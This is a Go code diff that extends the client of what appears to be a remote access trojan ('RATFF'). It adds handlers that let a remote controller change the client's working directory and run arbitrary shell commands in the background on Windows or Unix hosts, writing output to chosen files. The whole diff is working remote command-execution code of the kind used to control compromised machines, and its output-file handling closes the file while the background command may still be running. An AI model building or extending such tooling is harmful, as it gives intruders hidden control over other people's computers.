@@ -5,9 +5,16 @@ import (
 	"os"
 	"os/exec"
 	"runtime"
+	"sync"
 
 	"RATFF/shared"
 )
+
+// workingDir stores the current working directory for shell commands.
+var workingDir string
+
+// workingMu protects workingDir for concurrent access.
+var workingMu sync.RWMutex
 
 // executeCommand routes incoming commands to their handlers.
 func executeCommand(msg shared.Message) shared.Message {
@@ -16,14 +23,18 @@ func executeCommand(msg shared.Message) shared.Message {
 	switch msg.Command {
 	case shared.CmdShellExec:
 		return handleShellExec(msg)
+	case shared.CmdShellExecBg:
+		return handleShellExecBg(msg)
 	case shared.CmdSystemInfo:
 		return handleSystemInfo(msg)
 	case shared.CmdExit:
 		log.Info("Received exit command, shutting down")
 		os.Exit(0)
 		return shared.Message{}
+	case shared.CmdCd:
+		return handleCd(msg)
 	default:
-		return shared.NewMessage(shared.MsgError, "", msg.ClientID,
+		return shared.NewMessage(shared.MsgError, msg.Command, msg.ClientID,
 			map[string]interface{}{"error": "unknown command"})
 	}
 }
@@ -42,6 +53,12 @@ func handleShellExec(msg shared.Message) shared.Message {
 	} else {
 		cmd = exec.Command("sh", "-c", cmdStr)
 	}
+
+	workingMu.RLock()
+	if workingDir != "" {
+		cmd.Dir = workingDir
+	}
+	workingMu.RUnlock()
 
 	var stdout, stderr bytes.Buffer
 	cmd.Stdout = &stdout
@@ -72,4 +89,78 @@ func handleShellExec(msg shared.Message) shared.Message {
 func handleSystemInfo(msg shared.Message) shared.Message {
 	info := shared.BuildClientInfo(msg.ClientID)
 	return shared.NewMessage(shared.MsgResponse, "", msg.ClientID, info.ToPayload())
+}
+
+// handleCd changes the working directory of the client.
+func handleCd(msg shared.Message) shared.Message {
+	dir, _ := msg.Payload["dir"].(string)
+	if dir == "" {
+		return shared.NewMessage(shared.MsgError, shared.CmdCd, msg.ClientID,
+			map[string]interface{}{"error": "empty directory"})
+	}
+
+	workingMu.Lock()
+	err := os.Chdir(dir)
+	if err == nil {
+		workingDir = dir
+	}
+	workingMu.Unlock()
+
+	if err != nil {
+		return shared.NewMessage(shared.MsgError, shared.CmdCd, msg.ClientID,
+			map[string]interface{}{"error": err.Error()})
+	}
+
+	currentDir, _ := os.Getwd()
+	return shared.NewMessage(shared.MsgResponse, shared.CmdCd, msg.ClientID,
+		map[string]interface{}{"current_dir": currentDir})
+}
+
+// handleShellExecBg executes a shell command in background and returns immediately.
+// The command output can be redirected to a file if specified in the payload.
+func handleShellExecBg(msg shared.Message) shared.Message {
+	cmdStr, _ := msg.Payload["cmd"].(string)
+	if cmdStr == "" {
+		return shared.NewMessage(shared.MsgError, "", msg.ClientID,
+			map[string]interface{}{"error": "empty command"})
+	}
+
+	var cmd *exec.Cmd
+	if runtime.GOOS == "windows" {
+		cmd = exec.Command("cmd", "/C", cmdStr)
+	} else {
+		cmd = exec.Command("sh", "-c", cmdStr)
+	}
+
+	workingMu.RLock()
+	if workingDir != "" {
+		cmd.Dir = workingDir
+	}
+	workingMu.RUnlock()
+
+	outputFile, _ := msg.Payload["output_file"].(string)
+	if outputFile != "" {
+		file, err := os.Create(outputFile)
+		if err != nil {
+			return shared.NewMessage(shared.MsgError, "", msg.ClientID,
+				map[string]interface{}{"error": err.Error()})
+		}
+		cmd.Stdout = file
+		cmd.Stderr = file
+		defer file.Close()
+	}
+
+	err := cmd.Start()
+	if err != nil {
+		return shared.NewMessage(shared.MsgError, "", msg.ClientID,
+			map[string]interface{}{"error": err.Error()})
+	}
+
+	result := map[string]interface{}{
+		"status":      "started",
+		"command":     cmdStr,
+		"output_file": outputFile,
+	}
+
+	return shared.NewMessage(shared.MsgResponse, shared.CmdShellExecBg, msg.ClientID, result)
 }
